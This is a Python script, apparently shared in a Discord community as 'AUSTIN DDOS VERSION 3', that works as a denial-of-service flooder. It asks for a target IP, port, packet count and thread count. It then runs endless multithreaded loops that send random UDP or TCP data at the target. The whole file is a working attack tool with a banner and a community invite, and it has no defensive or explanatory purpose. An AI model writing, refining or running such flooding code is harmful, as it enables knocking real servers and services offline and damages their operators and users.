#!/usr/bin/env python3
#CREATED BY AustinFennix#3519
import random
import socket
import sys
import os
import threading
import time

os.system("clear")
print("""\x1b[1;92m

░█████╗░██╗░░░██╗░██████╗████████╗██╗███╗░░██╗░░░░░░██████╗░██╗░░░██╗
██╔══██╗██║░░░██║██╔════╝╚══██╔══╝██║████╗░██║░░░░░░██╔══██╗╚██╗░██╔╝
███████║██║░░░██║╚█████╗░░░░██║░░░██║██╔██╗██║█████╗██████╔╝░╚████╔╝░
██╔══██║██║░░░██║░╚═══██╗░░░██║░░░██║██║╚████║╚════╝██╔═══╝░░░╚██╔╝░░
██║░░██║╚██████╔╝██████╔╝░░░██║░░░██║██║░╚███║░░░░░░██║░░░░░░░░██║░░░
╚═╝░░╚═╝░╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝░░░░░░╚═╝░░░░░░░░╚═╝░░░
 """)
print(" ⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉ ")
print(" ➤ CREATED BY AUSTIN FENNIX ")
print(" ➤ AUSTIN DDOS VERSION 3 ")
print(" ➤ JOIN Xs TEAM COMMUNITY ")
print(" ➤ https://discord.gg/Zx8D8Dhm ")
print(" ⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉⑉ ")

ip = str(input(" IP Addreas :"))
port = int(input(" Port Server :"))
choice = str(input(" Attacking? (y/n)):"))
times = int(input(" Packet :"))
threads = int(input(" Thread :"))
os.system("clear")
def run():
	data = random._urandom(1024)
	i = random.choice(("[×]","[?]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XS AUSTIN IS HERE ")
		except:
			print("[!] Closed Connection")

def run2():
	data = random._urandom(16)
	i = random.choice(("[×]","[?]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XS AUSTIN IS HERE ")
		except:
			s.close()
			print("[*] Closed Connection")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()